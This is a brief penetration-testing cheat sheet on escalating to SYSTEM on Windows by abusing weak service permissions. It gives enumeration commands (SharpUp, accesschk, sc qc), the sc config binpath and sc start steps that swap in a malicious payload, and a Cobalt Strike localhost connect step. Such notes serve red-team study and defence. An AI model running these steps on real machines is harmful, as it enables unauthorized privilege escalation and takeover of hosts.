# Windows Service Permissions

- Check the permissions on the service, can a default user modify the service?

- Change the binary location to malicous payload
- Change the permissions the service runs as to SYSTEM
- Restart the service

## Enumeration

- Find service permissions

```
SharpUp.exe audit ModifiableServices
```

- Accesscheck from sysinternals 
- Look for services with CHANGECONFIG or SERVICE_ALL_ACCESS permissions. 

```
sc qc <service name>
```

## Exploitation

- Replace the binary with a malicious one
- restart the service

```
sc config <service name> binpath= <malicious payload>
sc start <servicename>
```

## Cobalt Strike

- Use a TCP localhost then connect to it when the service runs

```
connect localhost <port>
```
